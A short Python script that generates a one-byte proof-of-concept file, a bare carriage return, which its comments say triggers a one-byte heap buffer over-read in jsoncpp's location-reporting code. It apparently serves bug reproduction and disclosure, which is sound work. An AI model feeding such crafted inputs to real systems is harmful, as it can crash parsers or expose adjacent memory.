#!/usr/bin/env python3
# generate_poc.py - rematerialize the 1-byte CR PoC for the jsoncpp HBO read.
# A single carriage-return (0x0d) at end-of-buffer drives the CR-LF look-ahead
# in Json::OurReader::getLocationLineAndColumn one byte past the heap region.
poc = bytes([0x0d])
open("poc.bin", "wb").write(poc)
print(f"wrote poc.bin ({len(poc)} byte: bare CR)")
